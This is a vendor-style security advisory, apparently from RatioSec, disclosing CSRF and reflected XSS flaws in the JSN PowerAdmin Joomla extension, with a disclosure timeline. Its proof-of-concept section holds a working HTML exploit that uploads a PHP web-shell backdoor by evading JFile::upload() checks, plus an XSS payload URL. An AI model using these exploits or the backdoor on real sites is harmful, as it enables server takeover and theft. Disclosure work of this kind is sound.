@@ -1,0 +1,122 @@
+---------------------------------------------------------
+RatioSec Research Security Advisory RS-2016-001
+---------------------------------------------------------
+
+JSN PowerAdmin Joomla! Extension Remote Command Execution Via CSRF and
+XSS vulnerabilities
+---------------------------------------------------------
+
+Product: JSN PowerAdmin Joomla! Extension
+Vendor: JoomlaShine.com
+Tested Versions: 2.3.0
+Other Vulnerable Versions: Prior versions may also be affected
+Vendor Notification: 28th January, 2016
+Advisory Publication: 24th February, 2016
+CVE Reference: Pending
+RatioSec Advisory Reference: RS-2016-001
+Risk Level: High
+CVSSv3 Base Score: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
+
+---------------------------------------------------------
+
+RatioSec Research has discovered two cross-site request forgery and
+reflected cross-site scripting vulnerabilities in JSN PowerAdmin
+Joomla! Extension which can be exploited, respectively, to upload PHP
+files and run arbitrary HTML and script code in a user's browser
+session in context of the affected web site.
+
+1) The application allows users to perform certain actions via HTTP
+requests without performing proper checks to verify the requests
+validity. An authenticated user's browser can be forced to upload PHP
+files via the extension installer and subsequently execute arbitrary
+commands with the web server privileges by tricking the user into
+visiting a malicious web site.
+
+2) Input passed to `identified_name` GET parameter when `package` is
+set, `option` is set to `com_poweradmin`, `view` is set to
+`installer`, and `task` is set to `installer.install` in
+`/administrator/index.php` is not properly sanitised before being
+reflected. This can be exploited to run arbitrary HTML and script code
+in a user's browser session in context of the affected web site.
+
+---------------------------------------------------------
+
+Proof of Concept
+
+Read the advisory details on the RatioSec Research website for the
+proof of concept code.
+http://www.ratiosec.com/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss/
+
+----------------------------------------------------------
+
+Solution
+
+No official solution is currently available.
+
+----------------------------------------------------------
+
+Timeline
+
+- First contact: 27th January, 2016
+- Disclosure: 28th January, 2016. Preliminary date set to 10th, February 2016.
+- E-mail notice after no response: 02nd February, 2016
+- Advisory Publication: 24th February, 2016
+
+----------------------------------------------------------
+
+Advisory URL
+
+http://www.ratiosec.com/2016/jsn-poweradmin-joomla-extension-rce-via-csrf-and-xss/
+
+RatioSec Research
+
+Mail: research at ratiosec dot com
+Web: http://www.ratiosec.com/
+Twitter: https://twitter.com/ratio_sec
+
+
+
+----------------
+Proof Of Concept
+
+1) The following HTML page exploits the cross-site request forgery vulnerability and uploads a malicious PHP script system($_GET['cmd']); as /tmp/bd.phtml if visited by a logged-in administrator.
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/no8/joomla/administrator/index.php?option=com_poweradmin&view=installer&task=installer.install", true);
+        xhr.setRequestHeader("Accept", "*/*");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------167969427914885435381146171168");
+        xhr.withCredentials = true;
+        var body = "-----------------------------167969427914885435381146171168\r\n" +
+          "Content-Disposition: form-data; name=\"package\"; filename=\"bd.phtml\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "\x3cscript language=\"php\"\x3esystem($_GET['cmd']);\r\n" +
+          "\r\n" +
+          "-----------------------------167969427914885435381146171168--\r\n" +
+          "\r\n" +
+          "\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+The file extension .phtml and the <script language="php"> </script> tags are used here to fool the Joomla API JFile::upload() file validation checks. As result, the backdoor is installed permanently as /tmp/bd.phtml which can be used lately by the attacker to obtain the full system compromise.
+
+Command Execution
+
+2) The following URL exploits the cross-site scripting vulnerability to execute javascript code in a logged-in administrator’s browser.
+
+http://localhost/joomla/administrator/index.php?package=foobar&option=com_poweradmin&view=installer&task=installer.install&identified_name=<img+src%3dx+onerror=alert("RatioSecResearch")>
